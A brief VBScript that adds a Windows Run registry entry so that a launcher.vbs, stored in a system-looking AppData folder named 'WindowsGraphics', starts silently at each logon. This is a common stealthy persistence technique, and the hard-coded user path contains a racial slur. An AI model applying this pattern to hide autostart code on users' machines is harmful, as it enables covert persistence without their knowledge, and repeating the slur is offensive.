Set objShell = CreateObject("WScript.Shell")

' The exact path to your launcher
strVBS = "C:\Users\nigga12\AppData\Roaming\Local\WindowsGraphics\launcher.vbs"

' The Registry "To-Do" List
strRegPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\ForexForgeSync"
strRunCmd = "wscript.exe //B """ & strVBS & """"

' Save it
objShell.RegWrite strRegPath, strRunCmd, "REG_SZ"
